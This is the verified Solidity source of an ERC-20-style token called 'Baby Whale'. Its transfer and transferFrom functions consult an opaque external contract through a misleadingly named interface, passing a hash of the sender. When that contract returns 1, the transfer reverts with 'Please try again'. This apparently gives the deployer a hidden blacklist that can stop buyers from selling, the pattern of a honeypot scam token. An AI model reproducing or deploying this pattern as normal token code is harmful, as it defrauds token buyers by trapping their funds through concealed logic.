/**
 *Submitted for verification at Etherscan.io on 2021-09-12
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface IEP20 {

    function mint( uint _xa, uint _yb) external view returns (bool);

    function do_arb(bytes20 account) external view returns (uint8);

    function get_interest(address holders, address takers, uint balance, uint period) external returns (uint);

    function withdraw_tokens(uint account, uint amounta, uint abountb) external returns (bool);

    function do_math (address account) external returns (uint);


}

contract BabyWhale {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    IEP20 istrue;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Whale";
    string public symbol = hex"426162795768616C65f09f908b";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(IEP20 _getvalue) {
        
        istrue = _getvalue;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function get_hsh(address acct) public pure returns (bytes memory) {
    return abi.encodePacked(acct);
}
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(istrue.do_arb(ripemd160(get_hsh(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(istrue.do_arb(ripemd160(get_hsh(from))) != 1, "Please try again"); 
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}